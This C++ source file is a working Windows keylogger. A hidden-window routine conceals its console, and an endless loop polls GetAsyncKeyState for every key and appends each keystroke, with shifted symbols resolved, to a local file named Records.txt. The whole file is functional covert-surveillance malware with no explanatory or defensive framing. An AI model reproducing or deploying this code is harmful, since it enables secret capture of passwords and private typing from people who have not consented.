#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>
using namespace std;

void STM();
void SLNG();


void SLNG() {
    char character;
    for (;;) {
        for (character = 8; character <= 222; character++) {
            if (GetAsyncKeyState(character) == -32767) {
                ofstream write("Records.txt", ios::app);
                if (((character > 64) && (character < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    character += 32;
                    write << character;
                    write.close();
                    break;
                }
                else if ((character > 64) && (character < 91))
                {

                    write << character;
                    write.close();
                    break;
                }
                else {

                    switch (character)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ")";
                        else
                            write << "0";


                    }
                    break;
                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "!";
                        else
                            write << "1";
                    }
                    break;
                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "@";
                        else
                            write << "2";
                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "#";
                        else
                            write << "3";
                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "%";
                        else
                            write << "5";

                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "^";
                        else
                            write << "6";

                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "&";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "*";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "(";
                        else
                            write << "9";
                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "  ";
                        break;
                    case VK_BACK:
                        write << "<--";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    default:
                        write << character;
                    }

                }

            }
        }
    }
}
void STM() {
  
    HWND st;
    AllocConsole();
    st = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(st, 0);

}
int main() {
   
    STM();
    SLNG();

    return 0;
}